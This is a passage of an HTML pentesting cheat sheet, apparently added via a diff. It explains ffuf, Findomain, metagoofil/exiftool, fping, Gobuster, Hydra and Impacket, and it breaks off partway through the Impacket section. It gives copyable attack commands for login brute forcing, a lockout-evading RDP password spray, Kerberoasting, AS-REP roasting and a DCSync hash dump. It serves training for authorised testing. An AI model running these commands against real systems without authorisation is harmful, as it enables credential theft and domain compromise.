+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>ffuf's <code>-ac</code> (autocalibration) flag automatically detects the target's 'fake 200 not-found page' pattern and filters it out on the fly — a real time-saver against modern apps that never return a genuine 404, which has become common enough that most experienced testers now default to enabling this.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">POST-form login brute force with success filtering</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>ffuf -w passwords.txt -u http://$IP/login.php -X POST -d 'username=zak&amp;password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fc 200 -fr 'Invalid credentials'</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Filters out the known failure response (both by status code and a regex match on the error text) so only genuinely different — likely successful — responses remain visible in the output.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>ffuf is the single most-used general-purpose fuzzer among efficient testers today, precisely because one tool covers directories, vhosts, subdomains, and parameter/POST fuzzing without switching syntax. Autocalibration (<code>-ac</code>) in particular has become close to a default flag against modern web apps.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="findomain">
+      <div class="section-header">
+        <div class="section-number">12</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🌐</span>
+          <h2>Findomain</h2>
+          <span class="section-cat">Recon &amp; OSINT</span>
+        </div>
+      </div>
+      <p class="section-tagline">A very fast certificate-transparency-driven subdomain finder — now a freemium tool.</p>
+      <p class="section-overview">Findomain earned its reputation on raw speed, since it's written in Rust and queries multiple
+ sources concurrently. It's still useful as a quick first pass, but its business model has changed since it
+ was purely open-source, which is worth knowing before you plan a workflow around it.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li><b>Correction/update:</b> Findomain restructured to a freemium model — the free CLI version's access to several premium data sources (including its own monitoring/webhook features) is now gated behind a paid Findomain Monitoring subscription. The core certificate-transparency (crt.sh-based) enumeration shown in the original commands still works for free, but don't expect free-tier results to match the tool's full advertised source list without a subscription.</li>
+<li>All flag syntax shown (<code>-t</code>, <code>-o</code>, <code>-f</code>, <code>-q</code>, <code>-u</code>, <code>--sources</code>, <code>--exclude-sources</code>) remains accurate.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Basic enumeration</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>findomain -t example.com</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Fast, free certificate-transparency-log-based subdomain discovery.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A plain list of discovered subdomains, typically returned in seconds.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Cross-reference against amass/subfinder output — each tool's source mix differs slightly, so overlap-checking catches gaps.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Sparse results now more often reflect free-tier source limits than a genuinely small attack surface — don't conclude 'small footprint' from Findomain alone.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-o &lt;file&gt;</code></td><td>Save output.</td></tr>
+<tr><td class="opt-flag"><code>-f &lt;file&gt;</code></td><td>Bulk mode — multiple domains from a file.</td></tr>
+<tr><td class="opt-flag"><code>-q</code></td><td>Quiet, subdomains only.</td></tr>
+<tr><td class="opt-flag"><code>-u</code></td><td>JSON output.</td></tr>
+<tr><td class="opt-flag"><code>--sources</code></td><td>Restrict to specific sources.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Combine with subfinder and dedupe for a merged list</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>findomain -t example.com -q &gt; f.txt
+subfinder -d example.com -silent &gt; s.txt
+cat f.txt s.txt | sort -u &gt; merged_subs.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Since no single passive source has full coverage, the actual efficient pattern is running two or three fast tools in parallel and deduping — this five-second habit consistently surfaces a handful of subdomains that any single tool alone would have missed.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Findomain is a fine quick-check tool but rarely anyone's sole subdomain source anymore; <code>subfinder</code> (from ProjectDiscovery, fully free and very actively maintained) has become the more common default first tool in 2026 workflows, with Findomain and amass used as supplementary cross-checks.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="foca">
+      <div class="section-header">
+        <div class="section-number">13</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">📄</span>
+          <h2>FOCA</h2>
+          <span class="section-cat">OSINT &amp; Metadata</span>
+        </div>
+      </div>
+      <p class="section-tagline">Windows GUI metadata harvester — a still-useful but largely superseded OSINT tool.</p>
+      <p class="section-overview">FOCA automated a genuinely valuable OSINT workflow: find public documents on a domain, extract
+ their metadata (author names, software versions, internal usernames, sometimes internal file paths), and map
+ that back to organizational structure. The workflow is still valid; the tool itself has aged, and most working
+ testers now assemble the same pipeline from lighter, cross-platform, scriptable tools.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>The described workflow (web search → download → extract metadata → analyze) and feature list are accurate to how FOCA actually works.</li>
+<li>Important context missing from the original sheet: FOCA is Windows-only, GUI-only, and development has slowed considerably in recent years — it's no longer the default choice for this workflow on most current Linux-based pentest setups.</li>
+<li>The same core capability (extracting EXIF/document metadata) is fully covered today by <code>exiftool</code> (cross-platform, scriptable, actively maintained) combined with <code>metagoofil</code> or a manual Google dork + wget pipeline — this is genuinely how most current testers replicate FOCA's job on a Linux attack box.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Modern cross-platform equivalent of FOCA's core workflow</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>metagoofil -d example.com -t pdf,docx,xlsx -l 50 -n 20 -o loot/ \
+  &amp;&amp; exiftool loot/*.pdf loot/*.docx | grep -iE 'author|creator|producer|software'</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Reproduces FOCA's document-harvest-and-metadata-extract pipeline entirely from the Linux command line: metagoofil finds and downloads public documents by filetype, exiftool pulls the metadata fields that reveal usernames, software versions, and internal paths.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Author/Creator fields containing real names (potential username/email format guesses) and Producer/Software fields revealing internal software versions.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Compile discovered usernames into a naming-convention guess (firstname.lastname, f.lastname, etc.) for later password-spray target lists.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No metadata in modern Office/PDF exports — many organizations now strip metadata via 'Prepare for sharing' features, especially after security awareness training became common.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>Project → Add file</code></td><td>Add a local file for metadata extraction (FOCA GUI).</td></tr>
+<tr><td class="opt-flag"><code>Network → Scan for hosts</code></td><td>DNS/network mapping module (FOCA GUI).</td></tr>
+<tr><td class="opt-flag"><code>Metadata tab → Users</code></td><td>Aggregated username list extracted across all documents (FOCA GUI).</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Username-format inference from harvested metadata</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>exiftool -Creator -Author loot/*.* | sort -u</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Once you have a raw list of author names from document metadata, this is the actual next step nearly every tester takes: infer the org's email/username naming convention from the pattern (is it 'j.smith' or 'jsmith' or 'john.smith'?) and generate a full username list for password spraying against VPN, OWA, or O365.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>If you're on a Linux attack box (which is the overwhelming majority of current engagements), you'll likely never install FOCA — the metagoofil + exiftool combination above covers the same ground faster and fits the rest of your toolchain. Keep FOCA in mind only for engagements where a client specifically wants a Windows-native GUI report, or when you're troubleshooting an existing FOCA-based workflow inherited from an older team.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="fping">
+      <div class="section-header">
+        <div class="section-number">14</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🏓</span>
+          <h2>fping</h2>
+          <span class="section-cat">Network Discovery</span>
+        </div>
+      </div>
+      <p class="section-tagline">Parallel ICMP sweeping — the fast, simple first pass across a large IP range.</p>
+      <p class="section-overview">fping's whole value proposition is speed at scale: where a shell loop of individual ping commands
+ would take ages against a /16, fping pings hundreds of hosts concurrently and reports back which ones are
+ alive. It's the natural first step before a heavier port scan on any range larger than a handful of hosts.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All flags and command syntax shown are accurate and current.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Sweep a subnet</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>fping -a -g 192.168.1.0/24 2&gt;/dev/null</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Pings every address in the range in parallel and, with -a, prints only the hosts that respond.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A clean list of live IPs, ready to hand off to a port scanner.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Feed the output list directly into rustscan/nmap as the target file for the next phase.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Zero results across a whole subnet you know is populated usually means ICMP is blocked at a network boundary — fall back to a TCP-based sweep instead (masscan on a common port, or nmap -Pn).</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-g &lt;range/cidr&gt;</code></td><td>Generate targets from an IP range or CIDR.</td></tr>
+<tr><td class="opt-flag"><code>-f &lt;file&gt;</code></td><td>Read targets from a file.</td></tr>
+<tr><td class="opt-flag"><code>-a</code></td><td>Show only alive hosts.</td></tr>
+<tr><td class="opt-flag"><code>-u</code></td><td>Show only unreachable hosts.</td></tr>
+<tr><td class="opt-flag"><code>-c &lt;n&gt;</code></td><td>Ping count per host.</td></tr>
+<tr><td class="opt-flag"><code>-t &lt;ms&gt;</code></td><td>Timeout.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Pipe straight into a fast port scan</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>fping -a -g 10.10.10.0/24 2&gt;/dev/null | tee alive.txt | xargs -I{} -P 20 rustscan -a {} -- -sV</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>A common real-world one-liner: sweep for liveness, then immediately parallel-launch rustscan against every live host with 20 concurrent workers — this compresses what used to be a multi-hour full-range nmap sweep into a few minutes on a typical internal engagement.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Still the standard ICMP sweep tool for internal engagements where ICMP isn't blocked. On external engagements it's largely useless (ICMP is almost always filtered at the perimeter), so efficient testers reserve fping for internal/on-site work and default straight to TCP-based discovery (masscan/rustscan) externally.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="gobuster">
+      <div class="section-header">
+        <div class="section-number">15</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🚪</span>
+          <h2>Gobuster</h2>
+          <span class="section-cat">Web Content Discovery</span>
+        </div>
+      </div>
+      <p class="section-tagline">Go-based, multi-mode brute forcer — directories, DNS, vhosts, and cloud buckets in one binary.</p>
+      <p class="section-overview">Gobuster's strength is breadth of modes in a single, simple, fast tool: dir mode for content "
+ discovery, dns mode for subdomains, vhost mode for virtual hosts, plus dedicated s3/gcs modes for cloud bucket
+ hunting. It's less configurable than ffuf but often faster to reach for when you just need a straightforward
+ answer without building a custom FUZZ template.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All modes and flags described are accurate and current.</li>
+<li>Worth adding: Gobuster also has a <code>fuzz</code> mode (FUZZ-keyword-based, similar to ffuf's core mechanism) and a <code>tftp</code> mode for enumerating files on TFTP servers, both absent from the original sheet.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Directory brute force</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Multi-threaded directory/file discovery, noticeably faster than dirb on the same wordlist.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Interesting paths and their status codes.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Follow up on 301/302 redirects manually — they sometimes point to admin panels not otherwise linked.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Slow or zero results — check thread count isn't being throttled by a WAF; drop -t if you start seeing timeouts.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Subdomain brute force</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>gobuster dns -d example.com -w subdomains-top1million-5000.txt -t 50</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>DNS-based subdomain discovery via brute force rather than passive sources.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Valid subdomains that resolve, including internal-only ones not indexed anywhere public.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Resolve each hit's IP and check whether it's shared hosting (many subdomains, one IP) or dedicated infrastructure.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Wordlist too generic — try a target-specific wordlist built from OSINT (company products, team names, environments like dev/staging/uat).</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Virtual host brute force</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>gobuster vhost -u http://$IP -w subdomains-top1million-5000.txt --append-domain</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Finds other sites hosted on the same IP, distinguished only by the Host header.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Vhosts returning a meaningfully different response size/status from the baseline.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Add discovered vhosts to /etc/hosts and treat each as a separate target for its own content-discovery pass.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>All identical responses — note that modern gobuster needs --append-domain for vhost mode to correctly build FUZZ.example.com from a bare wordlist; forgetting it is the most common reason for a false 'no vhosts' result.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>dir</code></td><td>Directory/file brute forcing mode.</td></tr>
+<tr><td class="opt-flag"><code>dns</code></td><td>Subdomain brute forcing mode.</td></tr>
+<tr><td class="opt-flag"><code>vhost</code></td><td>Virtual host brute forcing mode.</td></tr>
+<tr><td class="opt-flag"><code>s3 / gcs</code></td><td>Cloud storage bucket enumeration.</td></tr>
+<tr><td class="opt-flag"><code>fuzz</code></td><td>Generic FUZZ-keyword mode, similar to ffuf.</td></tr>
+<tr><td class="opt-flag"><code>-x &lt;ext&gt;</code></td><td>File extensions to append (dir mode).</td></tr>
+<tr><td class="opt-flag"><code>-s &lt;codes&gt;</code></td><td>Only show these status codes.</td></tr>
+<tr><td class="opt-flag"><code>-b &lt;codes&gt;</code></td><td>Blacklist these status codes.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Cloud bucket sweep as part of external recon</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>gobuster s3 -w company_name_permutations.txt
+gobuster gcs -w company_name_permutations.txt</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>Modern external recon almost always includes a cloud storage bucket check — a wordlist of company-name permutations (companyname-backup, companyname-prod, companyname-assets, etc.) against S3/GCS naming conventions regularly turns up misconfigured public buckets, which are consistently among the highest-severity, easiest-to-explain findings in an external report.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Gobuster remains a solid daily-driver, especially for vhost and cloud bucket work where its dedicated modes are more convenient than building the equivalent manually in ffuf. For raw directory/file discovery speed and filtering flexibility though, most efficient testers now lean toward feroxbuster or ffuf.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="hydra">
+      <div class="section-header">
+        <div class="section-number">16</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🐉</span>
+          <h2>Hydra</h2>
+          <span class="section-cat">Credential Attacks</span>
+        </div>
+      </div>
+      <p class="section-tagline">The classic network-service brute forcer — still relevant, now used more surgically than broadly.</p>
+      <p class="section-overview">Hydra's per-service module system (ssh, ftp, rdp, smb, http-post-form, and dozens more) made it the
+ standard brute-force tool for years. It's still perfectly capable, though on real engagements today it's used
+ more as a targeted, single-service tool once you already have context (a likely username, a known weak
+ policy) rather than as a blind spray-everything tool.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li>All service examples, flags, and syntax shown are accurate and current.</li>
+<li>Worth noting explicitly: broad unthrottled Hydra runs against SSH, RDP, or AD-integrated services routinely trigger account lockouts or SOC alerts on modern environments — current best practice is checking the account lockout policy first (or using CrackMapExec/NetExec's built-in lockout-aware spraying) before any multi-password Hydra run against a domain-joined service.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">SSH brute force</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>hydra -L users.txt -P passwords.txt ssh://$IP -t 4</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Tries every user/password combination against SSH, throttled to 4 parallel tasks to reduce the chance of tripping fail2ban or similar defenses.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A line like [22][ssh] host: $IP login: zak password: zak123 on success.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Verify the credential manually with a direct ssh login before relying on it for anything further.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No hits, or connection resets partway through — the target likely has fail2ban or similar rate-limiting active; lower -t further and add a delay.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Web login form brute force</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>hydra -l zak -P passwords.txt $IP http-post-form "/login.php:username=^USER^&amp;password=^PASS^:F=Invalid username or password"</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Brute-forces a web login form by defining the POST body template and the exact failure-condition string to match against.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Any response that doesn't match the defined failure string.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Confirm the failure string is precise — a too-loose match will report false positives on every attempt.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>Form parameters or failure string wrong — verify both against the raw request in Burp before troubleshooting Hydra itself.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <h3 class='subhead'><span class='subhead-mark'>&#9656;</span> Options reference</h3>
+      <table class="opt-table">
+        <thead><tr><th>Flag</th><th>What it does</th></tr></thead>
+        <tbody><tr><td class="opt-flag"><code>-L / -l</code></td><td>Username list / single username.</td></tr>
+<tr><td class="opt-flag"><code>-P / -p</code></td><td>Password list / single password.</td></tr>
+<tr><td class="opt-flag"><code>-t &lt;n&gt;</code></td><td>Parallel tasks.</td></tr>
+<tr><td class="opt-flag"><code>-f</code></td><td>Exit on first valid login found.</td></tr>
+<tr><td class="opt-flag"><code>-e nsr</code></td><td>Also try null, same-as-username, and reversed-username passwords.</td></tr>
+<tr><td class="opt-flag"><code>-x</code></td><td>Route through a proxy.</td></tr></tbody>
+      </table>
+
+      <h3 class="subhead adv-subhead"><span class="subhead-mark">&#9656;</span> How efficient pentesters actually use this today</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card adv">
+        <div class="cmd-head">
+          <span class="cmd-title">Lockout-safe, low-and-slow spray against a domain-joined service</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>hydra -L users.txt -p 'Company2026!' rdp://$IP -t 1 -W 30</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag adv-tag">how it's used</span><span>This is the pattern experienced testers actually use against AD-integrated services: one password, every user (spray, not brute force), one task at a time, with a 30-second wait between attempts — deliberately slow enough to stay under most Active Directory lockout thresholds (typically 3-5 failed attempts per observation window) while still covering the whole user list over the engagement window.</span></div>
+        </div>
+      </div>
+      </div>
+
+      <div class="market-note">
+        <div class="market-head"><span class="mk-icon">&#128200;</span> Current market usage</div>
+        <p>Hydra is still installed and used, but for anything Active-Directory-adjacent (SMB, WinRM, RDP, LDAP), efficient testers increasingly reach for NetExec's built-in, lockout-aware password spraying instead, since it natively tracks and respects the domain's actual lockout policy rather than relying on manual timing guesses. Hydra remains the better choice for non-AD services (raw SSH, FTP, custom web forms) where that lockout-awareness isn't relevant.</p>
+      </div>
+    </section>
+
+    <section class="tool-section" id="impacket">
+      <div class="section-header">
+        <div class="section-number">17</div>
+        <div class="section-title-wrap">
+          <span class="section-icon">🎯</span>
+          <h2>Impacket</h2>
+          <span class="section-cat">Active Directory</span>
+        </div>
+      </div>
+      <p class="section-tagline">The Python library and script collection underpinning most modern AD attack tooling.</p>
+      <p class="section-overview">Impacket isn't one tool but a toolkit of individual scripts, each implementing a specific Windows/AD
+ protocol interaction from scratch in Python — which is exactly why it's so widely used: no dependency on
+ having Windows tools available, full control over the raw protocol exchange, and it's the reference "
+ implementation most other AD attack tools (like NetExec) build on top of internally.</p>
+
+      
+      <div class="factcheck">
+        <div class="factcheck-head">
+          <span class="fc-icon">&#9989;</span> Fact-check &amp; corrections
+        </div>
+        <ul><li><code>GetUserSPNs.py</code>, <code>GetNPUsers.py</code>, <code>secretsdump.py</code>, <code>psexec.py</code>, <code>smbserver.py</code>, <code>ntlmrelayx.py</code>, <code>ticketer.py</code>, <code>wmiexec.py</code>, <code>atexec.py</code>, and <code>mssqlclient.py</code> are all real, current Impacket scripts and the syntax shown for each is accurate.</li>
+<li><b>Correction:</b> <code>getPac.py</code> does not exist as a standalone Impacket script. The actual scripts for PAC/ticket work are <code>getTGT.py</code> (request and save a TGT to a ccache file), <code>getST.py</code> (request a service ticket, used for S4U2Self/S4U2Proxy delegation abuse), and <code>describeTicket.py</code> (parses and pretty-prints an existing ccache/kirbi ticket's PAC contents) — the correction is to use <code>describeTicket.py</code> for the PAC-inspection use case the original entry was describing.</li>
+<li><b>Correction:</b> <code>klist.py</code> is not an Impacket script either — <code>klist</code> is a native Windows (and Linux MIT-Kerberos) command for listing cached tickets, unrelated to the Impacket project. To view tickets on Linux with Impacket-adjacent tooling, use <code>KRB5CCNAME=ticket.ccache klist</code> (native klist against an Impacket-generated ccache file) rather than a nonexistent Impacket script.</li>
+<li><b>Correction:</b> a standalone <code>mimikatz.py</code> does not exist in Impacket. Credential dumping equivalent to Mimikatz functionality in the Impacket ecosystem is done via <code>secretsdump.py</code> (remote, no agent needed) — there is no direct Python reimplementation of Mimikatz's full feature set inside Impacket itself.</li></ul>
+      </div>
+
+      <h3 class="subhead"><span class="subhead-mark">&#9656;</span> Core commands, explained</h3>
+      <div class="cmd-grid">
+        
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Kerberoasting</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>GetUserSPNs.py -request -dc-ip $IP example.com/zak:zak123</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Requests TGS tickets for every account with a registered Service Principal Name — these tickets are encrypted with the service account's own password hash, so if that password is weak, the ticket can be cracked offline.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>A list of hashcat/John-formatted ticket hashes, one per kerberoastable account.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Crack offline with hashcat mode 13100 — this doesn't touch the target again, so it's zero-risk from a detection standpoint once you have the tickets.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No kerberoastable accounts found — the domain may have no service accounts with SPNs configured, which is itself a sign of decent AD hygiene.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">AS-REP Roasting</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>GetNPUsers.py example.com/ -dc-ip $IP -usersfile users.txt -format hashcat -no-pass</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Requests authentication for any account that has 'Do not require Kerberos preauthentication' set — a misconfiguration that lets you get a crackable hash without any valid credentials at all.</span></div>
+          <div class="meta-row"><span class="meta-tag look">look for</span><span>Hashcat-formatted hashes for each vulnerable account.</span></div>
+          <div class="meta-row"><span class="meta-tag next">next</span><span>Crack offline with hashcat mode 18200.</span></div>
+          <div class="meta-row"><span class="meta-tag fail">if stuck</span><span>No AS-REP roastable users — most modern domains have preauth enabled by default, so a hit here is a specific, deliberate misconfiguration worth flagging clearly in the report.</span></div>
+        </div>
+      </div>
+
+      <div class="cmd-card">
+        <div class="cmd-head">
+          <span class="cmd-title">Dumping domain secrets (DCSync)</span>
+          <button class="copy-btn" onclick="copyCmd(this)" aria-label="Copy command">copy</button>
+        </div>
+        <pre class="cmd-pre"><code>secretsdump.py -just-dc-ntlm example.com/zak:zak123@$IP</code></pre>
+        <div class="cmd-meta">
+          <div class="meta-row"><span class="meta-tag why">why</span><span>Performs a DCSync attack — impersonating a Domain Controller to request replication of every account's password hash, including krbtgt.</span></div>
